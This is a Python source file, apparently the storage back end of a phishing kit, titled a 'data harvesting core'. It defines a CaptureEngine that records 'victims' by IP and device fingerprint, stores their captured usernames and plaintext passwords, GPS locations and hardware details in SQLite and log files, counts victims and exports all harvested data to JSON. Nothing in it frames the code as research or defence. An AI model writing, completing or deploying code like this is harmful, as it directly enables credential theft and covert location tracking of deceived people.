#!/usr/bin/env python3
# Capture Engine - Data harvesting core
# Author: xspeen

import json
import hashlib
import sqlite3
import os
from datetime import datetime

class CaptureEngine:
    def __init__(self):
        self.logs_dir = 'logs'
        os.makedirs(self.logs_dir, exist_ok=True)
        self.db_path = os.path.join(self.logs_dir, 'sessions.db')
        self.init_database()

    def init_database(self):
        """Initialize SQLite database for structured storage"""
        conn = sqlite3.connect(self.db_path)
        c = conn.cursor()

        # Victims table
        c.execute('''CREATE TABLE IF NOT EXISTS victims (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            ip TEXT,
            timestamp TEXT,
            fingerprint TEXT,
            user_agent TEXT,
            platform TEXT
        )''')

        # Credentials table
        c.execute('''CREATE TABLE IF NOT EXISTS credentials (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            victim_id INTEGER,
            timestamp TEXT,
            username TEXT,
            password TEXT,
            FOREIGN KEY (victim_id) REFERENCES victims (id)
        )''')

        # Locations table
        c.execute('''CREATE TABLE IF NOT EXISTS locations (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            victim_id INTEGER,
            timestamp TEXT,
            latitude REAL,
            longitude REAL,
            accuracy REAL,
            FOREIGN KEY (victim_id) REFERENCES victims (id)
        )''')

        # Device fingerprints table
        c.execute('''CREATE TABLE IF NOT EXISTS devices (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            victim_id INTEGER,
            timestamp TEXT,
            screen_width INTEGER,
            screen_height INTEGER,
            timezone TEXT,
            battery_level REAL,
            hardware_concurrency INTEGER,
            device_memory REAL,
            FOREIGN KEY (victim_id) REFERENCES victims (id)
        )''')

        conn.commit()
        conn.close()

    def generate_fingerprint(self, data):
        """Generate unique fingerprint from device data"""
        fingerprint_data = {
            'user_agent': data.get('userAgent', ''),
            'platform': data.get('platform', ''),
            'screen': f"{data.get('screenWidth', '')}x{data.get('screenHeight', '')}",
            'timezone': data.get('timezone', ''),
            'language': data.get('language', '')
        }
        fingerprint_string = json.dumps(fingerprint_data, sort_keys=True)
        return hashlib.sha256(fingerprint_string.encode()).hexdigest()

    def add_victim(self, ip, device_data):
        """Add new victim to database"""
        fingerprint = self.generate_fingerprint(device_data)
        timestamp = datetime.now().isoformat()
        user_agent = device_data.get('userAgent', '')
        platform = device_data.get('platform', '')

        conn = sqlite3.connect(self.db_path)
        c = conn.cursor()
        c.execute('''INSERT INTO victims (ip, timestamp, fingerprint, user_agent, platform)
                     VALUES (?, ?, ?, ?, ?)''',
                  (ip, timestamp, fingerprint, user_agent, platform))
        victim_id = c.lastrowid
        conn.commit()
        conn.close()
        return victim_id

    def get_victim_by_ip(self, ip):
        """Get victim ID by IP address"""
        conn = sqlite3.connect(self.db_path)
        c = conn.cursor()
        c.execute('SELECT id FROM victims WHERE ip = ? ORDER BY timestamp DESC LIMIT 1', (ip,))
        row = c.fetchone()
        conn.close()
        return row[0] if row else None

    def store_credentials(self, ip, username, password, device_data=None):
        """Store captured credentials"""
        victim_id = self.get_victim_by_ip(ip)
        if not victim_id and device_data:
            victim_id = self.add_victim(ip, device_data)
        elif not victim_id:
            victim_id = self.add_victim(ip, {})

        timestamp = datetime.now().isoformat()

        conn = sqlite3.connect(self.db_path)
        c = conn.cursor()
        c.execute('''INSERT INTO credentials (victim_id, timestamp, username, password)
                     VALUES (?, ?, ?, ?)''',
                  (victim_id, timestamp, username, password))
        conn.commit()
        conn.close()

        # Also save to text file
        with open('logs/credentials.log', 'a') as f:
            f.write(f"[{timestamp}] {ip} | {username}:{password}\n")

        return True

    def store_location(self, ip, latitude, longitude, accuracy):
        """Store GPS location"""
        victim_id = self.get_victim_by_ip(ip)
        if not victim_id:
            victim_id = self.add_victim(ip, {})

        timestamp = datetime.now().isoformat()

        conn = sqlite3.connect(self.db_path)
        c = conn.cursor()
        c.execute('''INSERT INTO locations (victim_id, timestamp, latitude, longitude, accuracy)
                     VALUES (?, ?, ?, ?, ?)''',
                  (victim_id, timestamp, latitude, longitude, accuracy))
        conn.commit()
        conn.close()

        # Save to text file
        with open('logs/locations.txt', 'a') as f:
            f.write(f"[{timestamp}] {ip} | {latitude},{longitude} (accuracy: {accuracy}m)\n")

        return True

    def store_device_fingerprint(self, ip, device_data):
        """Store device fingerprint"""
        victim_id = self.get_victim_by_ip(ip)
        if not victim_id:
            victim_id = self.add_victim(ip, device_data)

        timestamp = datetime.now().isoformat()

        conn = sqlite3.connect(self.db_path)
        c = conn.cursor()
        c.execute('''INSERT INTO devices (
            victim_id, timestamp, screen_width, screen_height, timezone,
            battery_level, hardware_concurrency, device_memory
        ) VALUES (?, ?, ?, ?, ?, ?, ?, ?)''',
        (victim_id, timestamp,
         device_data.get('screenWidth'),
         device_data.get('screenHeight'),
         device_data.get('timezone'),
         device_data.get('batteryLevel'),
         device_data.get('hardwareConcurrency'),
         device_data.get('deviceMemory')))
        conn.commit()
        conn.close()

        # Save to JSON file
        with open('logs/devices.json', 'a') as f:
            device_data['timestamp'] = timestamp
            device_data['ip'] = ip
            f.write(json.dumps(device_data) + '\n')

        return True

    def get_statistics(self):
        """Get capture statistics"""
        conn = sqlite3.connect(self.db_path)
        c = conn.cursor()

        c.execute('SELECT COUNT(*) FROM victims')
        victims_count = c.fetchone()[0]

        c.execute('SELECT COUNT(*) FROM credentials')
        creds_count = c.fetchone()[0]

        c.execute('SELECT COUNT(*) FROM locations')
        locations_count = c.fetchone()[0]

        conn.close()

        return {
            'victims': victims_count,
            'credentials': creds_count,
            'locations': locations_count
        }

    def export_all(self, output_file='output/export.json'):
        """Export all data to JSON"""
        os.makedirs('output', exist_ok=True)

        conn = sqlite3.connect(self.db_path)
        conn.row_factory = sqlite3.Row
        c = conn.cursor()

        data = {
            'victims': [],
            'credentials': [],
            'locations': [],
            'devices': []
        }

        # Get all victims
        c.execute('SELECT * FROM victims')
        for row in c.fetchall():
            data['victims'].append(dict(row))

        # Get all credentials
        c.execute('SELECT * FROM credentials')
        for row in c.fetchall():
            data['credentials'].append(dict(row))

        # Get all locations
        c.execute('SELECT * FROM locations')
        for row in c.fetchall():
            data['locations'].append(dict(row))

        # Get all devices
        c.execute('SELECT * FROM devices')
        for row in c.fetchall():
            data['devices'].append(dict(row))

        conn.close()

        with open(output_file, 'w') as f:
            json.dump(data, f, indent=2)

        return output_file
